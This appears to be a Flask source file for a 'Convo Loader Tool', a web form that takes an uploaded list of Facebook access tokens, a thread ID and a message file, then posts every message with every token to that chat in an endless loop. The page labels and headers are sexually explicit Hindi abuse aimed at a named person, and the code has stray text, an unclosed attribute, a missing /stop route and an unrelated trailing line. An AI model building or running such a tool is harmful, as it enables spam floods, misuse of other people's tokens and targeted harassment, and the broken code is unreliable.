from flask import Flask, request
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))
            threads.append(thread)
            thread.start()

    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SMARTY URF MAHTAB KA BAP RIYAZ</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body{
      background-image: url('https://i.ibb.');
    }
    .container{
      max-width: 500px;
      background-size: cover;
      border-radius: 0px;
      padding: 0px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 50px auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 0px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: black;
    }
    .whatsapp-link {
 red  display: inline-block;
      color: black;
      text-decoration: none;
      margin-top: 10px;
    }
    .whatsapp-link i {
      margin-right: 5px;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h2 class="mb-3">🤍((𝗦𝗠𝗔𝗥𝗧𝗬 𝗨𝗥𝗙 𝗠𝗔𝗛𝗧𝗔𝗕 𝗞𝗜 𝗠𝗔𝗞𝗜 𝗖𝗛𝗨𝗧 𝗣𝗘 𝗣𝗘𝗧𝗥𝗢𝗟 𝗗𝗔𝗟 𝗞𝗥 𝗔𝗔𝗚 𝗟𝗔𝗚𝗔𝗡𝗘 𝗪𝗔𝗟𝗔 𝗗𝗔𝗥𝗜𝗡𝗗𝗔 𝗥𝗜𝗬𝗔𝗭 𝗞𝗜𝗡𝗚 𝗛𝗘𝗥𝗘❤))🖤</h2>
    <h1 class="mt-3">𝗠𝗥 : 𝗥𝗜𝗬𝗔𝗭 𝗕𝗔𝗗𝗠𝗔𝗦𝗛 𝗠𝗔𝗛𝗧𝗔𝗕 𝗞𝗜𝗡𝗡𝗔𝗥 𝗞𝗔 𝗕𝗔𝗔𝗣 𝗕𝗢𝗟𝗧𝗜𝗜 𝗣𝗨𝗕𝗟𝗜𝗖</h1>
  </header>
  <div class="container ttext-center>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenFile" class="form-label">SMARTY URF MAHTAB KI MAKI CHUT ME TOKEN FILE ATTACH KR</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">SMARTY URF MAHTAB KI NANI KI CHUT ME THREAD ID DAAL NA BE</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">SMARTY URF MAHTAB KI MAKI CHUT KE HATRS KE NAME BTA CHAL</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">SMARTY URF MAHTAB KI BEHAN KO KITNI ZOR SE CHODEGA BTA (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">SMARTY URF MAHTAB KI MAKI CHUT ME NOTEPAD FILE DAL LAMBI WALI</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Start Sending Messages</button>
    </form>
    <form method="post" action="/stop">
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop Sending Messages</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; Developed by SMARTY URF MAHTAB KA JIJA RIYAZ BADMASH.</p>
    <p>Convo/Mahtab ki maki chut fadne wala Loader Tool</p>
    <p>Made with 🖤 by <a href="https://www.facebook.com/azam.bhadwe.ka.jija.aryan.here?mibextid=ZbWKwL">MAHTAB KA JIJA RIYAZ INSIDE</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+919598121756" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
</body>
</html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
matches = db.prefix("prefix")
